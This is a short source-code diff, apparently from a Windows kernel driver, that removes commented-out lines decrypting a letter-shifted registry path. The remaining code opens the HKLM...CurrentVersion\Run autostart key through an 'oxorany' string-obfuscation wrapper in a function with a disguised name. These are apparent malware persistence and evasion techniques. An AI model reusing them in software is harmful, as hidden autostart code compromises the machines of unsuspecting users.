@@ -1,4 +1,4 @@
-﻿#pragma once
+#pragma once
 #include "includes.h"
 #include "cff.h"
 
@@ -310,13 +310,6 @@ NTSTATUS UUIID()
     HANDLE hKey = NULL;
     NTSTATUS status = STATUS_SUCCESS;
     ULONG disposition;
-
-
-    //CHAR _encryptedPath[] = "\\Pcegqrpw\\Kyafglc\\Qmdruypc\\Kgapmqmdr\\Uglbmuq\\AsppclrTcpqgml\\Psl";
-    //CHAR decryptedPath[64]; // Adjust the size based on the decrypted string length
-    //KeGetCurrentRelativeStackState(_encryptedPath, decryptedPath, sizeof(_encryptedPath));
-
-    //RtlInitUnicodeString(&keyPath, (PCWSTR)decryptedPath);
 
 
     RtlInitUnicodeString(&keyPath, oxorany(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
